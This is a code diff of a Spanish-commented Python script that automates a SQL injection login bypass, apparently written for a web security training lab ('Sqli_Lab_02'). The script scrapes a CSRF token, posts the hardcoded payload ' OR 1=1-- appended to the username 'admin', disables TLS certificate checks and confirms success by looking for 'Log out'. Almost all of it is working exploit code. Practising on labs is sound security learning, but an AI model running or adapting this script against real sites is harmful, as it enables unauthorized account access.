@@ -8,39 +8,41 @@ import requests
 import sys
 import urllib3
 from bs4 import BeautifulSoup
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #Elimina el mensaje que que https no tiene certificado 
 
-proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+#Elimina el mensaje que que https no tiene certificado 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
 
-def get_csrf_token(s, url):
-    r = s.get(url + "/login", verify=False, proxies=proxy)
-    soup = BeautifulSoup(r.text, 'html.parser')
-    csrf = soup.find("input")['value']
-    return csrf
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+Ruta = "/login"
+Payload = "' OR 1=1--"
 
-def exploit_bypasslogin(s, url, payload):
-    csrf = get_csrf_token(s, url)
-    data = {"csrf": csrf,
-            "username": payload,
-            "password": "noimportaquehayaqui"}
-    r = s.post(url + "/login", data=data, verify=False, proxies=proxy)
-    res = r.text
-    if "Log out" in res: #el texto "Log out" aparece solo si se ha iniciado sessión con exito
-        return True
+def Obtener_Token_CSRF(Session,Url):
+    SolicitudWeb = Session.get(Url + Ruta, verify=False, proxies=proxies )
+    Parseando = BeautifulSoup(SolicitudWeb.content, 'html.parser')
+    TokenCSRF = Parseando.find("input")['value']
+    return TokenCSRF
+
+def Sqli_Lab_02(Url,Session):
+    Token = Obtener_Token_CSRF(Session,Url)
+    ParametrosPost = {"csrf": Token,
+                      "username":"admin"+Payload,
+                      "password":"caulquiercosa"
+    }
+    EnvioDatosPost = Session.post(Url + Ruta, data=ParametrosPost, verify=False, proxies=proxies)
+    RespuestaServidor = EnvioDatosPost.text
+    if "Log out" in RespuestaServidor:
+        print(f'[+] SQLi Bypass Inicio de sessión exitoso, Payload:{Payload}')
     else:
-        return False
+        print('[+] SQLi Bypass Inicio de sessión fallido')
 
 if __name__ == "__main__":
     try:
-        url = sys.argv[1].strip()
-        sqli_payload = sys.argv[2].strip()
+        Url = sys.argv[1].strip()
+        S = requests.Session()
+        Sqli_Lab_02(Url,S)
     except:
-        print('[-] Uso: %s <url> <sql-payload>' % sys.argv[0])
-        print('[-] Ejemplo: %s www.ejemplo.com "1=1--"' % sys.argv[0])
+        print('[-] Uso: %s <url> ' % sys.argv[0])
+        print('[-] Ejemplo: %s www.ejemplo.com ' % sys.argv[0])
 
-    s = requests.Session()
+    
 
-    if exploit_bypasslogin(s, url, sqli_payload):
-        print('[+] SQLi Bypass Inicio de sessión exitoso')
-    else:
-        print('[+] SQLi Bypass Inicio de sessión fallido')
